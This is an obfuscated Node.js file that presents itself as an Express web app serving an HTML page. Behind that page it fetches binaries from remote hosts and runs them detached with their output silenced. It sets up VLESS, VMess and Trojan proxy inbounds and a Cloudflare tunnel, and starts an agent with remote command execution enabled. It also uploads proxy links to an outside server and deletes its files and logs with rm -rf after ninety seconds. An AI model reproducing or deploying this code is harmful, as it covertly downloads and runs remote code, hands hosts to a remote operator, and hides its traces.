const _0x13796c=_0x4446;function _0x4446(_0x5f0eeb,_0x9c2224){const _0x3d40e5=_0x3d40();return _0x4446=function(_0x44461b,_0x2ccd12){_0x44461b=_0x44461b-0xca;let _0x3a690a=_0x3d40e5[_0x44461b];return _0x3a690a;},_0x4446(_0x5f0eeb,_0x9c2224);}(function(_0x33c9ea,_0x51f95b){const _0x54e213=_0x4446,_0x1381c4=_0x33c9ea();while(!![]){try{const _0x29de8c=parseInt(_0x54e213(0xcb))/0x1*(-parseInt(_0x54e213(0x133))/0x2)+-parseInt(_0x54e213(0x127))/0x3+parseInt(_0x54e213(0x122))/0x4*(-parseInt(_0x54e213(0xf7))/0x5)+parseInt(_0x54e213(0x101))/0x6+parseInt(_0x54e213(0x17a))/0x7*(-parseInt(_0x54e213(0x13b))/0x8)+-parseInt(_0x54e213(0xf3))/0x9*(parseInt(_0x54e213(0x15b))/0xa)+-parseInt(_0x54e213(0x116))/0xb*(-parseInt(_0x54e213(0x15c))/0xc);if(_0x29de8c===_0x51f95b)break;else _0x1381c4['push'](_0x1381c4['shift']());}catch(_0x33e721){_0x1381c4['push'](_0x1381c4['shift']());}}}(_0x3d40,0xaeea0));const express=require(_0x13796c(0x121)),app=express(),axios=require(_0x13796c(0x128)),os=require('os'),fs=require('fs'),path=require(_0x13796c(0x136)),{promisify}=require(_0x13796c(0x168)),exec=promisify(require('child_process')[_0x13796c(0x138)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x13796c(0x11d)][_0x13796c(0x16d)]||'',PROJECT_URL=process[_0x13796c(0x11d)][_0x13796c(0x180)]||'',AUTO_ACCESS=process[_0x13796c(0x11d)][_0x13796c(0x152)]||![],FILE_PATH=process[_0x13796c(0x11d)][_0x13796c(0x10b)]||_0x13796c(0x185),SUB_PATH=process[_0x13796c(0x11d)][_0x13796c(0xe7)]||_0x13796c(0xf9),PORT=process['env'][_0x13796c(0x160)]||process[_0x13796c(0x11d)][_0x13796c(0x12c)]||0xbb8,KAMAN=process[_0x13796c(0x11d)][_0x13796c(0x17f)]||'9afd1229-b893-40c1-84dd-51e7ce204913',YOUNGHERO_SERVER=process[_0x13796c(0x11d)][_0x13796c(0x137)]||'',YOUNGHERO_PORT=process[_0x13796c(0x11d)][_0x13796c(0xdc)]||'',YOUNGHERO_KEY=process[_0x13796c(0x11d)][_0x13796c(0xca)]||'',SUIDAO_DOMAIN=process[_0x13796c(0x11d)][_0x13796c(0xff)]||'',SUIDAO_AUTH=process['env'][_0x13796c(0xdd)]||'',SUIDAO_PORT=process[_0x13796c(0x11d)][_0x13796c(0xe2)]||0x1f41,CFIP=process['env'][_0x13796c(0x105)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x13796c(0x139)]||0x1bb,NAME=process[_0x13796c(0x11d)][_0x13796c(0x13c)]||'Vls';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x13796c(0xee)](FILE_PATH+_0x13796c(0xf4))):console[_0x13796c(0xee)](FILE_PATH+_0x13796c(0x113));let npmPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0x16c)),phpPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0x181)),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0xf8)),subPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0x173)),listPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0xd9)),bootLogPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0xe4)),configPath=path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0xea));function deleteNodes(){const _0x3ebb8f=_0x13796c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x5975b3;try{_0x5975b3=fs['readFileSync'](subPath,_0x3ebb8f(0x11b));}catch{return null;}const _0x3ca26b=Buffer[_0x3ebb8f(0x11c)](_0x5975b3,_0x3ebb8f(0x149))[_0x3ebb8f(0xe1)](_0x3ebb8f(0x11b)),_0x1367ab=_0x3ca26b[_0x3ebb8f(0x125)]('\x0a')[_0x3ebb8f(0xd3)](_0x4bb9ae=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3ebb8f(0x12e)](_0x4bb9ae));if(_0x1367ab[_0x3ebb8f(0x179)]===0x0)return;return axios[_0x3ebb8f(0x177)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3ebb8f(0x157)]({'nodes':_0x1367ab}),{'headers':{'Content-Type':_0x3ebb8f(0xe9)}})['catch'](_0xa46605=>{return null;});}catch(_0x5bd822){return null;}}function cleanupOldFiles(){const _0x420627=_0x13796c,_0x1d2ec3=[_0x420627(0x147),_0x420627(0xf8),'npm',_0x420627(0x181),'sub.txt',_0x420627(0xe4)];_0x1d2ec3[_0x420627(0x13a)](_0x48988b=>{const _0x7235cc=_0x420627,_0x3c4b5d=path['join'](FILE_PATH,_0x48988b);fs[_0x7235cc(0x166)](_0x3c4b5d,()=>{});});}app[_0x13796c(0x10a)]('/',function(_0x424c83,_0x1452bf){const _0x28e78c=_0x13796c;_0x1452bf[_0x28e78c(0xce)](path[_0x28e78c(0xf6)](__dirname,_0x28e78c(0xef)));});const config={'log':{'access':_0x13796c(0x17b),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':SUIDAO_PORT,'protocol':'vless','settings':{'clients':[{'id':KAMAN,'flow':'xtls-rprx-vision'}],'decryption':_0x13796c(0x169),'fallbacks':[{'dest':0xbb9},{'path':_0x13796c(0xcf),'dest':0xbba},{'path':'/vmess-suidao','dest':0xbbb},{'path':_0x13796c(0x123),'dest':0xbbc}]},'streamSettings':{'network':_0x13796c(0x163)}},{'port':0xbb9,'listen':_0x13796c(0x146),'protocol':_0x13796c(0xfc),'settings':{'clients':[{'id':KAMAN}],'decryption':_0x13796c(0x169)},'streamSettings':{'network':'tcp','security':_0x13796c(0x169)}},{'port':0xbba,'listen':_0x13796c(0x146),'protocol':_0x13796c(0xfc),'settings':{'clients':[{'id':KAMAN,'level':0x0}],'decryption':_0x13796c(0x169)},'streamSettings':{'network':'ws','security':_0x13796c(0x169),'wsSettings':{'path':_0x13796c(0xcf)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x13796c(0x104),_0x13796c(0xda)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x13796c(0x146),'protocol':_0x13796c(0x12b),'settings':{'clients':[{'id':KAMAN,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x13796c(0x154)}},'sniffing':{'enabled':!![],'destOverride':[_0x13796c(0xdf),_0x13796c(0x104),_0x13796c(0xda)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x13796c(0x146),'protocol':_0x13796c(0x150),'settings':{'clients':[{'password':KAMAN}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x13796c(0x123)}},'sniffing':{'enabled':!![],'destOverride':[_0x13796c(0xdf),_0x13796c(0x104),_0x13796c(0xda)],'metadataOnly':![]}}],'dns':{'servers':[_0x13796c(0x106)]},'outbounds':[{'protocol':_0x13796c(0x140),'tag':_0x13796c(0xf5)},{'protocol':_0x13796c(0x16e),'tag':_0x13796c(0x158)}]};function _0x3d40(){const _0x37b060=['npm','UPLOAD_URL','blackhole','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/php\x20-c\x20\x22','2087','SuidaoDomain:','sub.txt','https://oooo.serv00.net/add-url','./npm','\x20-p\x20','post','\x20successfully','length','7YyXmdZ','/dev/null','\x0a\x20\x20\x0atrojan://','/tunnel.yml\x20run','添加URL失败:\x20','KAMAN','PROJECT_URL','php','existsSync','./web','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','./tmp','YOUNGHERO_KEY','1097ljIOic','2096','push','sendFile','/vless-suidao','message','pipe','https://arm64.ssss.nyc.mn/v1','filter','/web\x20-c\x20','nohup\x20','fileName','php\x20is\x20running','--tls','list.txt','quic','./bot','YOUNGHERO_PORT','SUIDAO_AUTH','close','http','https://arm64.ssss.nyc.mn/web','toString','SUIDAO_PORT','SUIDAO_DOMAIN:','boot.log','unlinkSync','stream','SUB_PATH','\x20>/dev/null\x202>&1','application/json','config.json','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','SUIDAO_DOMAIN\x20or\x20SUIDAO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','amd','log','app.html','trim','Error\x20downloading\x20files:','text/plain;\x20charset=utf-8','18rsQYbH','\x20is\x20created','direct','join','5wBfIuN','bot','sub','https://arm64.ssss.nyc.mn/agent','Empowerment\x20failed\x20for\x20','vless','readFileSync','/api/add-nodes','SUIDAO_DOMAIN','/npm\x20-s\x20','4207950wScKDp','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tls','CFIP','https+local://8.8.8.8/dns-query','fileUrl','/bot\x20','Empowerment\x20success\x20for\x20','get','FILE_PATH','SuidaoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20SuidaoDomain','set','8443','2083','Subscription\x20uploaded\x20successfully','App\x20is\x20running','map','\x20already\x20exists','arm','chmod','1795464VvVCaE','2053','tunnel.yml','\x0a\x20\x20tunnel:\x20','Error\x20executing\x20command:\x20','utf-8','from','env','\x20>/dev/null\x202>&1\x20&','Download\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','express','3568772yXLyIt','/trojan-suidao','writeFileSync','split','\x20failed:\x20','2767353IFDwei','axios','response','createWriteStream','vmess','PORT','arm64','test','listen','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','2036qlCoWU','?encryption=none&security=tls&sni=','SUIDAO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','path','YOUNGHERO_SERVER','exec','CFPORT','forEach','3097960aJoFWw','NAME','Content-Type','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','YOUNGHERO\x20variable\x20is\x20empty,skip\x20running','freedom','config.yaml','error','data','includes','443','127.0.0.1','web','all','base64','unshift','false','https://amd64.ssss.nyc.mn/v1','./php','\x0aclient_secret:\x20','automatic\x20access\x20task\x20added\x20successfully','trojan','has','AUTO_ACCESS','true','/vmess-suidao','npm\x20is\x20running','status','stringify','block','catch','bot\x20is\x20running','6182570XgnWPK','336WwAcVU','clear','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20credentials-file:\x20','SERVER_PORT','match','\x0a\x20\x20\x20\x20','tcp','https://amd64.ssss.nyc.mn/agent','/vmess-suidao?ed=2560','unlink','Skipping\x20adding\x20automatic\x20access\x20task','util','none','?security=tls&sni=','https://arm64.ssss.nyc.mn/2go'];_0x3d40=function(){return _0x37b060;};return _0x3d40();}fs['writeFileSync'](path[_0x13796c(0xf6)](FILE_PATH,_0x13796c(0xea)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x371e0d=_0x13796c,_0x43d1a5=os['arch']();return _0x43d1a5==='arm'||_0x43d1a5===_0x371e0d(0x12d)||_0x43d1a5==='aarch64'?_0x371e0d(0x114):_0x371e0d(0xed);}function downloadFile(_0x41af90,_0x294ced,_0x44d080){const _0x131bb6=_0x13796c,_0xe8f512=path[_0x131bb6(0xf6)](FILE_PATH,_0x41af90),_0x28f670=fs[_0x131bb6(0x12a)](_0xe8f512);axios({'method':'get','url':_0x294ced,'responseType':_0x131bb6(0xe6)})['then'](_0x2c2286=>{const _0x2bde47=_0x131bb6;_0x2c2286[_0x2bde47(0x143)][_0x2bde47(0xd1)](_0x28f670),_0x28f670['on']('finish',()=>{const _0x27d523=_0x2bde47;_0x28f670[_0x27d523(0xde)](),console['log']('Download\x20'+_0x41af90+_0x27d523(0x178)),_0x44d080(null,_0x41af90);}),_0x28f670['on'](_0x2bde47(0x142),_0x19af20=>{const _0x5a788e=_0x2bde47;fs[_0x5a788e(0x166)](_0xe8f512,()=>{});const _0xb52e76='Download\x20'+_0x41af90+_0x5a788e(0x126)+_0x19af20[_0x5a788e(0xd0)];console['error'](_0xb52e76),_0x44d080(_0xb52e76);});})[_0x131bb6(0x159)](_0x2135cf=>{const _0xfc2507=_0x131bb6,_0x3d3ad7=_0xfc2507(0x11f)+_0x41af90+'\x20failed:\x20'+_0x2135cf['message'];console[_0xfc2507(0x142)](_0x3d3ad7),_0x44d080(_0x3d3ad7);});}async function downloadFilesAndRun(){const _0xb96058=_0x13796c,_0x159b2d=getSystemArchitecture(),_0x1d38bf=getFilesForArchitecture(_0x159b2d);if(_0x1d38bf[_0xb96058(0x179)]===0x0){console[_0xb96058(0xee)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5a6c13=_0x1d38bf[_0xb96058(0x112)](_0x3e01df=>{return new Promise((_0x407c18,_0x16e939)=>{const _0x170e8d=_0x4446;downloadFile(_0x3e01df[_0x170e8d(0xd6)],_0x3e01df[_0x170e8d(0x107)],(_0x50a1e4,_0x271cd9)=>{_0x50a1e4?_0x16e939(_0x50a1e4):_0x407c18(_0x271cd9);});});});try{await Promise[_0xb96058(0x148)](_0x5a6c13);}catch(_0x40f86a){console[_0xb96058(0x142)](_0xb96058(0xf1),_0x40f86a);return;}function _0x154ee8(_0x5c9476){const _0x2d6f78=0x1fd;_0x5c9476['forEach'](_0xf09f0f=>{const _0x1cdd75=_0x4446,_0x1aac84=path[_0x1cdd75(0xf6)](FILE_PATH,_0xf09f0f);fs[_0x1cdd75(0x182)](_0x1aac84)&&fs[_0x1cdd75(0x115)](_0x1aac84,_0x2d6f78,_0x45287c=>{const _0x13f5ac=_0x1cdd75;_0x45287c?console[_0x13f5ac(0x142)](_0x13f5ac(0xfb)+_0x1aac84+':\x20'+_0x45287c):console[_0x13f5ac(0xee)](_0x13f5ac(0x109)+_0x1aac84+':\x20'+_0x2d6f78[_0x13f5ac(0xe1)](0x8));});});}const _0x595218=YOUNGHERO_PORT?[_0xb96058(0x175),_0xb96058(0x183),_0xb96058(0xdb)]:[_0xb96058(0x14d),_0xb96058(0x183),_0xb96058(0xdb)];_0x154ee8(_0x595218);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x3bdba5=YOUNGHERO_SERVER[_0xb96058(0x144)](':')?YOUNGHERO_SERVER['split'](':')[_0xb96058(0x132)]():'',_0x4dfb4e=new Set(['443',_0xb96058(0x10e),'2096','2087','2083',_0xb96058(0x117)]),_0x5eaf90=_0x4dfb4e[_0xb96058(0x151)](_0x3bdba5)?_0xb96058(0x153):_0xb96058(0x14b),_0xdf5e58=_0xb96058(0x14e)+YOUNGHERO_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+YOUNGHERO_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x5eaf90+_0xb96058(0x16f)+KAMAN;fs[_0xb96058(0x124)](path[_0xb96058(0xf6)](FILE_PATH,_0xb96058(0x141)),_0xdf5e58);const _0x5e0f3b=_0xb96058(0xd5)+FILE_PATH+_0xb96058(0x170)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5e0f3b),console[_0xb96058(0xee)](_0xb96058(0xd7)),await new Promise(_0x3b880b=>setTimeout(_0x3b880b,0x3e8));}catch(_0x2afb08){console[_0xb96058(0x142)]('php\x20running\x20error:\x20'+_0x2afb08);}}else{let _0x25f4e7='';const _0x457cd1=[_0xb96058(0x145),_0xb96058(0x10e),_0xb96058(0xcc),_0xb96058(0x171),_0xb96058(0x10f),_0xb96058(0x117)];_0x457cd1[_0xb96058(0x144)](YOUNGHERO_PORT)&&(_0x25f4e7=_0xb96058(0xd8));const _0x87e5d3=_0xb96058(0xd5)+FILE_PATH+_0xb96058(0x100)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0xb96058(0x176)+YOUNGHERO_KEY+'\x20'+_0x25f4e7+_0xb96058(0x11e);try{await exec(_0x87e5d3),console['log'](_0xb96058(0x155)),await new Promise(_0xc3f260=>setTimeout(_0xc3f260,0x3e8));}catch(_0x596e18){console[_0xb96058(0x142)]('npm\x20running\x20error:\x20'+_0x596e18);}}}else console[_0xb96058(0xee)](_0xb96058(0x13f));const _0x4426ce=_0xb96058(0xd5)+FILE_PATH+_0xb96058(0xd4)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4426ce),console[_0xb96058(0xee)]('web\x20is\x20running'),await new Promise(_0x916043=>setTimeout(_0x916043,0x3e8));}catch(_0xf38601){console[_0xb96058(0x142)]('web\x20running\x20error:\x20'+_0xf38601);}if(fs['existsSync'](path[_0xb96058(0xf6)](FILE_PATH,_0xb96058(0xf8)))){let _0x44279d;if(SUIDAO_AUTH[_0xb96058(0x161)](/^[A-Z0-9a-z=]{120,250}$/))_0x44279d=_0xb96058(0x103)+SUIDAO_AUTH;else SUIDAO_AUTH[_0xb96058(0x161)](/TunnelSecret/)?_0x44279d='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0xb96058(0x17d):_0x44279d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+SUIDAO_PORT;try{await exec(_0xb96058(0xd5)+FILE_PATH+_0xb96058(0x108)+_0x44279d+_0xb96058(0x11e)),console['log'](_0xb96058(0x15a)),await new Promise(_0x1166a=>setTimeout(_0x1166a,0x7d0));}catch(_0x55130f){console[_0xb96058(0x142)]('Error\x20executing\x20command:\x20'+_0x55130f);}}await new Promise(_0x4518d3=>setTimeout(_0x4518d3,0x1388));}function getFilesForArchitecture(_0x51b71b){const _0x1dbf50=_0x13796c;let _0x4d4d9f;_0x51b71b===_0x1dbf50(0x114)?_0x4d4d9f=[{'fileName':_0x1dbf50(0x147),'fileUrl':_0x1dbf50(0xe0)},{'fileName':'bot','fileUrl':_0x1dbf50(0x16b)}]:_0x4d4d9f=[{'fileName':_0x1dbf50(0x147),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':_0x1dbf50(0xf8),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x378ebc=_0x51b71b===_0x1dbf50(0x114)?_0x1dbf50(0xfa):_0x1dbf50(0x164);_0x4d4d9f[_0x1dbf50(0x14a)]({'fileName':_0x1dbf50(0x16c),'fileUrl':_0x378ebc});}else{const _0x2a9baf=_0x51b71b===_0x1dbf50(0x114)?_0x1dbf50(0xd2):_0x1dbf50(0x14c);_0x4d4d9f[_0x1dbf50(0x14a)]({'fileName':_0x1dbf50(0x181),'fileUrl':_0x2a9baf});}}return _0x4d4d9f;}function suidaoType(){const _0x34a322=_0x13796c;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN){console[_0x34a322(0xee)](_0x34a322(0xec));return;}if(SUIDAO_AUTH[_0x34a322(0x144)]('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,_0x34a322(0x130)),SUIDAO_AUTH);const _0x3bca29=_0x34a322(0x119)+SUIDAO_AUTH[_0x34a322(0x125)]('\x22')[0xb]+_0x34a322(0x15f)+path[_0x34a322(0xf6)](FILE_PATH,_0x34a322(0x130))+_0x34a322(0x13e)+SUIDAO_DOMAIN+_0x34a322(0x131)+SUIDAO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x34a322(0x124)](path['join'](FILE_PATH,_0x34a322(0x118)),_0x3bca29);}else console[_0x34a322(0xee)](_0x34a322(0x135));}suidaoType();async function extractDomains(){const _0x390ed9=_0x13796c;let _0x15114a;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x15114a=SUIDAO_DOMAIN,console[_0x390ed9(0xee)](_0x390ed9(0xe3),_0x15114a),await _0x5bb6cf(_0x15114a);else try{const _0x131815=fs[_0x390ed9(0xfd)](path[_0x390ed9(0xf6)](FILE_PATH,_0x390ed9(0xe4)),_0x390ed9(0x11b)),_0x3fc1fd=_0x131815[_0x390ed9(0x125)]('\x0a'),_0x1b445a=[];_0x3fc1fd[_0x390ed9(0x13a)](_0x13e3dc=>{const _0x20a4fa=_0x390ed9,_0x4bf561=_0x13e3dc[_0x20a4fa(0x161)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4bf561){const _0x3ef745=_0x4bf561[0x1];_0x1b445a['push'](_0x3ef745);}});if(_0x1b445a['length']>0x0)_0x15114a=_0x1b445a[0x0],console[_0x390ed9(0xee)](_0x390ed9(0x172),_0x15114a),await _0x5bb6cf(_0x15114a);else{console[_0x390ed9(0xee)](_0x390ed9(0x10c)),fs[_0x390ed9(0xe5)](path[_0x390ed9(0xf6)](FILE_PATH,_0x390ed9(0xe4)));async function _0x234f0e(){const _0xf7b001=_0x390ed9;try{await exec(_0xf7b001(0x184));}catch(_0x5c6e61){}}_0x234f0e(),await new Promise(_0x4bcdeb=>setTimeout(_0x4bcdeb,0xbb8));const _0x47b577='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x390ed9(0x120)+SUIDAO_PORT;try{await exec(_0x390ed9(0xd5)+path[_0x390ed9(0xf6)](FILE_PATH,'bot')+'\x20'+_0x47b577+'\x20>/dev/null\x202>&1\x20&'),console[_0x390ed9(0xee)]('bot\x20is\x20running.'),await new Promise(_0x537236=>setTimeout(_0x537236,0xbb8)),await extractDomains();}catch(_0x42453b){console[_0x390ed9(0x142)](_0x390ed9(0x11a)+_0x42453b);}}}catch(_0x1a77a4){console[_0x390ed9(0x142)]('Error\x20reading\x20boot.log:',_0x1a77a4);}async function _0x5bb6cf(_0x11bf5d){const _0x292670=_0x390ed9,_0x526bdd=execSync(_0x292670(0xeb),{'encoding':'utf-8'}),_0xee8ab=_0x526bdd[_0x292670(0xf0)]();return new Promise(_0x4ec61f=>{setTimeout(()=>{const _0x4c3ad2=_0x4446,_0x4c27fa={'v':'2','ps':NAME+'-'+_0xee8ab,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':'none','net':'ws','type':_0x4c3ad2(0x169),'host':_0x11bf5d,'path':_0x4c3ad2(0x165),'tls':_0x4c3ad2(0x104),'sni':_0x11bf5d,'alpn':''},_0x4731d8='\x0avless://'+KAMAN+'@'+CFIP+':'+CFPORT+_0x4c3ad2(0x134)+_0x11bf5d+'&type=ws&host='+_0x11bf5d+'&path=%2Fvless-suidao%3Fed%3D2560#'+NAME+'-'+_0xee8ab+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON['stringify'](_0x4c27fa))['toString'](_0x4c3ad2(0x149))+_0x4c3ad2(0x17c)+KAMAN+'@'+CFIP+':'+CFPORT+_0x4c3ad2(0x16a)+_0x11bf5d+'&type=ws&host='+_0x11bf5d+'&path=%2Ftrojan-suidao%3Fed%3D2560#'+NAME+'-'+_0xee8ab+_0x4c3ad2(0x162);console[_0x4c3ad2(0xee)](Buffer[_0x4c3ad2(0x11c)](_0x4731d8)[_0x4c3ad2(0xe1)](_0x4c3ad2(0x149))),fs[_0x4c3ad2(0x124)](subPath,Buffer['from'](_0x4731d8)[_0x4c3ad2(0xe1)](_0x4c3ad2(0x149))),console[_0x4c3ad2(0xee)](FILE_PATH+_0x4c3ad2(0x102)),uplodNodes(),app[_0x4c3ad2(0x10a)]('/'+SUB_PATH,(_0x167ddb,_0x2685a2)=>{const _0x30af6c=_0x4c3ad2,_0x2ebd42=Buffer[_0x30af6c(0x11c)](_0x4731d8)['toString'](_0x30af6c(0x149));_0x2685a2[_0x30af6c(0x10d)](_0x30af6c(0x13d),_0x30af6c(0xf2)),_0x2685a2['send'](_0x2ebd42);}),_0x4ec61f(_0x4731d8);},0x7d0);});}}async function uplodNodes(){const _0x37c45b=_0x13796c;if(UPLOAD_URL&&PROJECT_URL){const _0x3fc4e6=PROJECT_URL+'/'+SUB_PATH,_0x5c96fe={'subscription':[_0x3fc4e6]};try{const _0x1cf7d6=await axios[_0x37c45b(0x177)](UPLOAD_URL+'/api/add-subscriptions',_0x5c96fe,{'headers':{'Content-Type':_0x37c45b(0xe9)}});if(_0x1cf7d6[_0x37c45b(0x156)]===0xc8)console[_0x37c45b(0xee)](_0x37c45b(0x110));else return null;}catch(_0x2cdb80){if(_0x2cdb80['response']){if(_0x2cdb80[_0x37c45b(0x129)][_0x37c45b(0x156)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x37c45b(0x182)](listPath))return;const _0xd54637=fs[_0x37c45b(0xfd)](listPath,_0x37c45b(0x11b)),_0x85941f=_0xd54637['split']('\x0a')[_0x37c45b(0xd3)](_0x316e7b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x316e7b));if(_0x85941f[_0x37c45b(0x179)]===0x0)return;const _0x525b90=JSON[_0x37c45b(0x157)]({'nodes':_0x85941f});try{await axios['post'](UPLOAD_URL+_0x37c45b(0xfe),_0x525b90,{'headers':{'Content-Type':_0x37c45b(0xe9)}});if(response[_0x37c45b(0x156)]===0xc8)console[_0x37c45b(0xee)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0xb62488){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2ffcd8=_0x4446,_0x507c1a=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(YOUNGHERO_PORT)_0x507c1a[_0x2ffcd8(0xcd)](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x507c1a['push'](phpPath);exec('rm\x20-rf\x20'+_0x507c1a['join']('\x20')+_0x2ffcd8(0xe8),_0x5bb48c=>{const _0x556e81=_0x2ffcd8;console[_0x556e81(0x15d)](),console[_0x556e81(0xee)](_0x556e81(0x111)),console[_0x556e81(0xee)](_0x556e81(0x15e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4cf201=_0x13796c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4cf201(0xee)](_0x4cf201(0x167));return;}try{const _0x53e3b2=await axios[_0x4cf201(0x177)](_0x4cf201(0x174),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4cf201(0xe9)}});console[_0x4cf201(0xee)](_0x4cf201(0x14f));}catch(_0xfdee02){console[_0x4cf201(0x142)](_0x4cf201(0x17e)+_0xfdee02[_0x4cf201(0xd0)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x13796c(0x12f)](PORT,()=>console[_0x13796c(0xee)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
